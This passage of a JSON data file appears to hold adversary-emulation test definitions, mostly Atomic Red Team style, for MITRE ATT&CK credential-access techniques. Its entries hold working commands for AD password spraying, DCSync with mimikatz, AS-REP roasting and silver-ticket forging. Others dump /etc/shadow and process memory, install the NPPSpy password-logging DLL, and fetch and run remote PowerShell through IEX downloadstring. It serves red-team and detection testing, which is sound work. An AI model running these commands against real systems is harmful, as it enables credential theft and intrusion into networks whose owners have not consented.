         "command": "if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {;   Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\";   exit 1; }; $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName; [System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null; $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389); $DomainUsers | Foreach-Object {;   $user = $_;   $password = 'P@ssw0rd!';   $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\");   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);   try {;     Write-Host \" [-] Attempting ${password} on account ${user}.\";     $conn.bind();     Write-Host \" [!] ${user}:${password} are valid credentials!\";   } catch {;     Write-Host $_.Exception.Message;   }; }; Write-Host \"End of password spraying\""
      }
   ],
   "T1003.006": [
      {
         "technique_id": "T1003.006",
         "technique_name": "OS Credential Dumping: DCSync",
         "tactic": "credential-access",
         "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n",
         "command": "%tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%\" \"exit\""
      },
      {
         "technique_id": "T1003.006",
         "technique_name": "OS Credential Dumping: DCSync",
         "tactic": "credential-access",
         "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n",
         "command": "Get-ADReplAccount -All -Server"
      }
   ],
   "T1558.004": [
      {
         "technique_id": "T1558.004",
         "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting",
         "tactic": "credential-access",
         "description": "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose"
      },
      {
         "technique_id": "T1558.004",
         "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting",
         "tactic": "credential-access",
         "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); Invoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\""
      },
      {
         "technique_id": "T1558.004",
         "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting",
         "tactic": "credential-access",
         "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
         "command": "cmd.exe /c \"C:\\Users\\puma-4\\Desktop\\Rubeus.exe\" asreproast /outfile:\"C:\\Users\\puma-4\\Desktop\\rubeus_output.txt\""
      }
   ],
   "T1003.008": [
      {
         "technique_id": "T1003.008",
         "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
         "tactic": "credential-access",
         "description": "/etc/passwd file is accessed in Linux environments\n",
         "command": "cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt"
      },
      {
         "technique_id": "T1003.008",
         "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
         "tactic": "credential-access",
         "description": "Dump /etc/passwd and /etc/shadow using bash builtins\n",
         "command": "function testcat(){ echo \"$(< $1)\"; }; testcat /etc/passwd > /tmp/T1003.008.txt; testcat /etc/shadow > /tmp/T1003.008.txt"
      },
      {
         "technique_id": "T1003.008",
         "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
         "tactic": "credential-access",
         "description": "/etc/shadow file is accessed in Linux environments\n",
         "command": "sudo cat /etc/shadow > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt"
      },
      {
         "technique_id": "T1003.008",
         "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
         "tactic": "credential-access",
         "description": "Dump /etc/passwd and /etc/shadow using ed\n",
         "command": "echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > /tmp/T1003.008.txt"
      }
   ],
   "T1003.007": [
      {
         "technique_id": "T1003.007",
         "technique_name": "OS Credential Dumping: Proc Filesystem",
         "tactic": "credential-access",
         "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\n",
         "command": "sh /tmp/T1003.007.sh; PID=$(pgrep -n -f \"T1003.007\"); PYTHON=$(which python || which python3 || which python2); $PYTHON 05c7d6_dump_heap.py $PID /tmp/T1003.007.bin; grep -i \"PASS\" \"/tmp/T1003.007.bin\""
      },
      {
         "technique_id": "T1003.007",
         "technique_name": "OS Credential Dumping: Proc Filesystem",
         "tactic": "credential-access",
         "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n",
         "command": "sh /tmp/T1003.007.sh; PID=$(pgrep -n -f \"T1003.007\"); HEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1); MEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1)))); MEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2)))); MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START))); dd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"; grep -i \"PASS\" \"/tmp/T1003.007.bin\""
      },
      {
         "technique_id": "T1003.007",
         "technique_name": "OS Credential Dumping: Proc Filesystem",
         "tactic": "credential-access",
         "description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n",
         "command": "if [ -x \"$(command -v ldd --version)\" ]; then : ; else sudo apt-get -y install libc-bin; fi; if [ -x \"$(command -v python2 --version)\" ]; then : ; else sudo apt-get -y install python2; fi; if [ -x \"$(command -v strings --version)\" ]; then : ; else sudo apt-get -y install binutils; fi; if [ -f \"/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh\" ]; then : ; else wget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz; mkdir /tmp/mimipenguin; tar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin; fi;  ;  sudo /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt; cat /tmp/T1003.007Test3.txt"
      }
   ],
   "T1552.007": [
      {
         "technique_id": "T1552.007",
         "technique_name": "Kubernetes List Secrets",
         "tactic": "credential-access",
         "description": "A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services or provide further access to the cluster.\n[More information about secrets](https://kubernetes.io/docs/concepts/configuration/secret/).\n\nThis test will make a request to the Kubernetes api at the `/api/v1/secrets` endpoint requesting every secret stored within the cluster.\n",
         "command": "kubectl get secrets --all-namespaces"
      },
      {
         "technique_id": "T1552.007",
         "technique_name": "Kubernetes List Secrets",
         "tactic": "credential-access",
         "description": "Access the Kubernetes service account access token stored within a container in a cluster.\n",
         "command": "kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token"
      },
      {
         "technique_id": "T1552.007",
         "technique_name": "Kubernetes List Secrets",
         "tactic": "credential-access",
         "description": "A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services.\n",
         "command": "kubectl get secrets -n default"
      }
   ],
   "T1110.004": [
      {
         "technique_id": "T1110.004",
         "technique_name": "Brute Force: Credential Stuffing",
         "tactic": "credential-access",
         "description": "Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack\n",
         "command": "C:\\Users\\puma-4\\Desktop\\kerbrute_windows_386.exe bruteforce --dc $ENV:userdnsdomain -d $ENV:userdomain \"C:\\Users\\puma-4\\Desktop\\bruteforce.txt\""
      },
      {
         "technique_id": "T1110.004",
         "technique_name": "Brute Force: Credential Stuffing",
         "tactic": "credential-access",
         "description": "Using username,password combination from a password dump to login over SSH.\n",
         "command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/; for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@localhost;done"
      },
      {
         "technique_id": "T1110.004",
         "technique_name": "Brute Force: Credential Stuffing",
         "tactic": "credential-access",
         "description": "Using username,password combination from a password dump to login over SSH.\n",
         "command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/; for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@localhost;done"
      }
   ],
   "T1110.002": [
      {
         "technique_id": "T1110.002",
         "technique_name": "Brute Force: Password Cracking",
         "tactic": "credential-access",
         "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against",
         "command": "cd PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe\\.. && PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule c5068b_sam.txt cab59f_password.lst"
      }
   ],
   "JYREGISTRYEVENTCUSTOMTHREE": [
      {
         "technique_id": "JYREGISTRYEVENTCUSTOMTHREE",
         "technique_name": "Registry event invoking custom activity 3",
         "tactic": "credential-access",
         "description": "Registry event invoking custom activity to investigate reason for only getting process events for caldera-technique process. References",
         "command": "New-Item -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY_3'; Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY_3' -Name 'JYPROPERTY_3' -Value 'JY'; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY_3'; Remove-Item -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY_3' -Recurse"
      }
   ],
   "T1552.005": [
      {
         "technique_id": "T1552.005",
         "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
         "tactic": "credential-access",
         "description": "This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. \nUpon successful execution, this test will scan all user attributes for any strings containing \"password\".\nThose unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. \nSee: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md\n",
         "command": "import-module msonline; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-MsolService -Credential $Credential; $users = Get-MsolUser -All; foreach($user in $users); {$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props); {if($user.$prop -like \"*password*\"); {(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}; get-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue"
      },
      {
         "technique_id": "T1552.005",
         "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
         "tactic": "credential-access",
         "description": "This test invokes a web request to the default Instance Metadata API of 169.254.169.254 in order to dump the data contained within it to a file. \nSee: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/\n",
         "command": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > $env:temp\\T1552.005Test2.txt"
      }
   ],
   "T1528": [
      {
         "technique_id": "T1528",
         "technique_name": "Steal Application Access Token",
         "tactic": "credential-access",
         "description": "Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.\nSee - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/",
         "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzureRmAccount -Credential $Credential; Get-AzurePasswords -subscription 'None' > $env:temp\\T1528Test1.txt; cat $env:temp\\T1528Test1.txt"
      }
   ],
   "T1555.001": [
      {
         "technique_id": "T1555.001",
         "technique_name": "Credentials from Password Stores: Keychain",
         "tactic": "credential-access",
         "description": "### Keychain Files\n\n  ~/Library/Keychains/\n\n  /Library/Keychains/\n\n  /Network/Library/Keychains/\n\n  [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)\n\n  [Keychain dumper](https://github.com/juuso/keychaindump)\n",
         "command": "security -h; security find-certificate -a -p > /tmp/certs.pem; security import /tmp/certs.pem -k"
      }
   ],
   "JYFILEEVENTCUSTOM": [
      {
         "technique_id": "JYFILEEVENTCUSTOM",
         "technique_name": "File event invoking custom activity",
         "tactic": "credential-access",
         "description": "File event invoking custom activity to investigate reason for only getting process events for caldera-technique process. References www.tutorialspoint.com/powershell/powershell_files_create_files.htm , www.itprotoday.com/powershell/how-write-powershell-output-file",
         "command": "New-Item -Path \"joonyoung_custom_newfile.txt\" -ItemType File; \"I will be written to joonyoung_custom_newfile.txt\" | Out-File -FilePath \"joonyoung_custom_newfile.txt\"; Get-Content \"joonyoung_custom_newfile.txt\"; Remove-Item \"joonyoung_custom_newfile.txt\""
      }
   ],
   "JYREGISTRYEVENTCUSTOMTWO": [
      {
         "technique_id": "JYREGISTRYEVENTCUSTOMTWO",
         "technique_name": "Registry event invoking custom activity 2",
         "tactic": "credential-access",
         "description": "Registry event invoking custom activity to investigate reason for only getting process events for caldera-technique process. References",
         "command": "New-Item -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY_2'; Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY_2' -Name 'JYPROPERTY_2' -Value 'JY'; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY_2'; Remove-Item -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY_2' -Recurse"
      }
   ],
   "T1552.002": [
      {
         "technique_id": "T1552.002",
         "technique_name": "Unsecured Credentials: Credentials in Registry",
         "tactic": "credential-access",
         "description": "Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry\nentries are found, they will be displayed.\n",
         "command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s"
      },
      {
         "technique_id": "T1552.002",
         "technique_name": "Unsecured Credentials: Credentials in Registry",
         "tactic": "credential-access",
         "description": "Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word \"password\" will be displayed.\n",
         "command": "reg query HKLM /f password /t REG_SZ /s && reg query HKCU /f password /t REG_SZ /s"
      },
      {
         "technique_id": "T1552.002",
         "technique_name": "Unsecured Credentials: Credentials in Registry",
         "tactic": "credential-access",
         "description": "Search for possible credentials stored in Registry",
         "command": "reg query HKCU /f password /t REG_SZ /s\n"
      },
      {
         "technique_id": "T1552.002",
         "technique_name": "Unsecured Credentials: Credentials in Registry",
         "tactic": "credential-access",
         "description": "Search for possible credentials stored in the HKLM Hive",
         "command": "reg query HKLM /f password /t REG_SZ /s\n"
      }
   ],
   "JYCUSTOM": [
      {
         "technique_id": "JYCUSTOM",
         "technique_name": "Custom No-Command Ability Technique to Only Generate Artifactual Events",
         "tactic": "credential-access",
         "description": "Custom No-Command Ability(Technique) to Only Generate Artifactual Events",
         "command": "echo \"nothing\""
      }
   ],
   "JYNETWORKEVENTCUSTOM": [
      {
         "technique_id": "JYNETWORKEVENTCUSTOM",
         "technique_name": "Network event invoking custom activity",
         "tactic": "credential-access",
         "description": "Network event invoking custom activity to investigate reason for only getting process events for caldera-technique process. References www.techtarget.com/searchnetworking/tip/PowerShell-commands-for-network-troubleshooting",
         "command": "ping ocelot.cs.binghamton.edu; Test-Connection ocelot.cs.binghamton.edu; Get-NetTCPConnection -LocalPort 135"
      }
   ],
   "T1003": [
      {
         "technique_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "credential-access",
         "description": "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's followed by two 32 character hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\gsecdump.exe\" -a"
      },
      {
         "technique_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "credential-access",
         "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",
         "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config"
      },
      {
         "technique_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "credential-access",
         "description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.\nAfter user's logging in cleartext password is saved in C:\\NPPSpy.txt.\nClean up deletes the files and reverses Registry changes.\nNPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy",
         "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"; $path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER; $UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"; Set-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore; echo \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\""
      },
      {
         "technique_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "credential-access",
         "description": "The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n",
         "command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full"
      },
      {
         "technique_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "credential-access",
         "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",
         "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*"
      },
      {
         "technique_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "credential-access",
         "description": "This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. The only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling RDP, etc.).\nReference: https://twitter.com/0gtweet/status/1415671356239216653",
         "command": "rundll32.exe keymgr,KRShowKeyMgr"
      },
      {
         "technique_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "credential-access",
         "description": "Custom GO credential dumper using minidumpwritedump",
         "command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n"
      }
   ],
   "JYFILEEVENTCUSTOMTHREE": [
      {
         "technique_id": "JYFILEEVENTCUSTOMTHREE",
         "technique_name": "File event invoking custom activity 3",
         "tactic": "credential-access",
         "description": "File event invoking custom activity to investigate reason for only getting process events for caldera-technique process. References www.tutorialspoint.com/powershell/powershell_files_create_files.htm , www.itprotoday.com/powershell/how-write-powershell-output-file 2",
         "command": "New-Item -Path \"joonyoung_custom_newfile_3.txt\" -ItemType File; \"I will be written to joonyoung_custom_newfile_3.txt\" | Out-File -FilePath \"joonyoung_custom_newfile_3.txt\"; Get-Content \"joonyoung_custom_newfile_3.txt\"; Remove-Item \"joonyoung_custom_newfile_3.txt\""
      }
   ],
   "JYFILEEVENTCUSTOMTWO": [
      {
         "technique_id": "JYFILEEVENTCUSTOMTWO",
         "technique_name": "File event invoking custom activity 2",
         "tactic": "credential-access",
         "description": "File event invoking custom activity to investigate reason for only getting process events for caldera-technique process. References www.tutorialspoint.com/powershell/powershell_files_create_files.htm , www.itprotoday.com/powershell/how-write-powershell-output-file 3",
         "command": "New-Item -Path \"joonyoung_custom_newfile_2.txt\" -ItemType File; \"I will be written to joonyoung_custom_newfile_2.txt\" | Out-File -FilePath \"joonyoung_custom_newfile_2.txt\"; Get-Content \"joonyoung_custom_newfile_2.txt\"; Remove-Item \"joonyoung_custom_newfile_2.txt\""
      }
   ],
   "T1552.003": [
      {
         "technique_id": "T1552.003",
         "technique_name": "Unsecured Credentials: Bash History",
         "tactic": "credential-access",
         "description": "Search through bash history for specifice commands we want to capture\n",
         "command": "cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt"
      },
      {
         "technique_id": "T1552.003",
         "technique_name": "Unsecured Credentials: Bash History",
         "tactic": "credential-access",
         "description": "Get contents of bash history",
         "command": "find ~/.bash_sessions -name '*' -exec cat {} \\; 2>/dev/null"
      }
   ],
   "T1003.004": [
      {
         "technique_id": "T1003.004",
         "technique_name": "OS Credential Dumping: LSA Secrets",
         "tactic": "credential-access",
         "description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\T1003.004\\bin\\PsExec.exe\" -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y"
      }
   ],
   "T1558.002": [
      {
         "technique_id": "T1558.002",
         "technique_name": "Steal or Forge Kerberos Tickets: Silver Ticket",
         "tactic": "credential-access",
         "description": "Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
         "command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore"
      }
   ],
   "T1003.005": [
      {
         "technique_id": "T1003.005",
         "technique_name": "OS Credential Dumping: Cached Domain Credentials",
         "tactic": "credential-access",
         "description": "List credentials currently stored on the host via the built-in Windows utility cmdkey.exe\nCredentials listed with Cmdkey only pertain to the current user\nPasswords will not be displayed once they are stored\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey\nhttps://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n",
         "command": "cmdkey /list"
      }
   ],
   "T1552": [
      {
         "technique_id": "T1552",
         "technique_name": "Unsecured Credentials",
         "tactic": "credential-access",
         "description": "This atomic runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/\n",
